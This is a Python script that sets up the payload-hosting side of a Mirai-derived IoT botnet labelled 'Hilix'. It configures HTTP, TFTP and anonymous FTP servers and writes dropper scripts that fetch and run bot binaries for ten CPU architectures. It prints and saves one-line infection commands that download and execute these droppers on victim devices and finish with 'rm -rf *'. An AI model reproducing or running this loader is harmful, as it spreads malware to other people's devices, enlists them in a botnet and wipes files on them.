import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "SSH"
exec_name = "Hilix-SSH"
bin_prefix = "Hilix."
bin_directory = "bins"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm4",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\x1b[0;31mSetting Up your ROOT And SSH Payload....")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\x1b[0;37mExporting to payload.txt...")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/Hilix3.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Hilix3.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Hilix3.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/Hilix2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Hilix2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Hilix2.sh')
run('echo "#!/bin/bash" > /var/www/html/Hilix.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Hilix2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Hilix2.sh')
run('echo "#!/bin/bash" > /var/ftp/Hilix1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/Hilix1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/Hilix1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/Hilix.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/Hilix1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/Hilix3.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/Hilix2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;37m L e t s   A d d   M i r a i   H a c k s   \x1b[0;92mL e a k e d   B y   R e b o r n")
print("\x1b[0;37m----------------------------------------------------------------------------")
print("\x1b[1;37mSSH Payload: \x1b[0;31mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Hilix.sh; curl -O http://" + ip + "/Hilix.sh; chmod 777 Hilix.sh; sh Hilix.sh; tftp " + ip + " -c get Hilix3.sh; chmod 777 Hilix3.sh; sh Hilix3.sh; tftp -r Hilix2.sh -g " + ip + "; chmod 777 Hilix2.sh; sh Hilix2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " Hilix1.sh Hilix1.sh; sh Hilix1.sh; rm -rf Hilix.sh Hilix3.sh Hilix2.sh Hilix1.sh; rm -rf *\x1b[0m")
print("\x1b[0;31m----------------------------------------------------------------------------")
print("\x1b[1;37mROOT PayLoader: \x1b[0;31mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins/Hilix.x86 -O /tmp/Hilix; chmod +x /tmp/Hilix; /tmp/Hilix Hilix.x86")
print("\x1b[0;37m----------------------------------------------------------------------------")
complete_payload1 = ("(SSH Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Hilix.sh; curl -O http://" + ip + "/Hilix.sh; chmod 777 Hilix.sh; sh Hilix.sh; tftp " + ip + " -c get Hilix3.sh; chmod 777 Hilix3.sh; sh Hilix3.sh; tftp -r Hilix2.sh -g " + ip + "; chmod 777 Hilix2.sh; sh Hilix2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " Hilix1.sh Hilix1.sh; sh Hilix1.sh; rm -rf Hilix.sh Hilix3.sh Hilix2.sh Hilix1.sh; rm -rf *)")
complete_tab = ("																			")
complete_line = ("---------------------------------------------------------------------------------------------------------------------------------------------------------------------")

complete_payload2 = ("(ROOT PayLoader: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins/Hilix.x86 -O /tmp/Hilix; chmod +x /tmp/Hilix; /tmp/Hilix Hilix.x86)")
f = open("payload.txt","w+")
f.write(complete_payload1)
f.write(complete_tab)
f.write(complete_line)

f.write(complete_payload2)
f.close()
raw_input("\x1b[0;31mPayloaders are in payload.txt....")
